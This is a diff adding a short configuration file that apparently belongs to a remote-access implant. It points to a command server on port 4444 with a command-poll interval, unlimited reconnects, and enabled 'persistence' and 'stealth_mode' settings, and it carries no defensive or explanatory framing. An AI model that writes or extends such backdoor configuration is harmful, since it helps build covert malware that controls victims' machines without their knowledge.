@@ -1,0 +1,11 @@
+[network] 
+server_address = "192.168.1.41" 
+server_port = 4444 
+reconnect_delay = 30 
+heartbeat_interval = 60 
+command_poll_interval = 5 
+max_reconnect_attempts = 0 
+ 
+[features] 
+persistence_enabled = true 
+stealth_mode = true 
